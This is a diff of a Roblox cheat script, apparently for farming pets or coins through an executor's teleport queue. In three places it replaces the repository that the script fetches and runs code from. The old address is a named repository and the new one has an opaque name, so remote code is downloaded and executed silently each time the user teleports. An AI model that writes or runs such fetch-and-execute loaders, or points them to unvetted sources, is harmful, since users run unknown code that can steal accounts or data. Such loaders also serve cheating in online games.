@@ -114,7 +114,7 @@ function sendPets(coinID)
 			pcall(function()
 				syn.queue_on_teleport([[
 				getgenv().totalServers = ]]..totalServers..[[
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/4lve/Roblox/main/QuestCompleter"))()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/EEEFGA/sdxyfhgj/main/2"))()
 				]])
 			end)
 			return true
@@ -130,7 +130,7 @@ function sendPets(coinID)
 	pcall(function()
 		syn.queue_on_teleport([[
 		getgenv().totalServers = ]]..totalServers..[[
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/4lve/Roblox/main/QuestCompleter"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/EEEFGA/sdxyfhgj/main/2"))()
 		]])
 	end)
 end
@@ -191,7 +191,7 @@ end)
 pcall(function()
 	syn.queue_on_teleport([[
 	getgenv().totalServers = ]]..totalServers..[[
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/4lve/Roblox/main/QuestCompleter"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EEEFGA/sdxyfhgj/main/2"))()
 	]])
 end)
 console.newline()
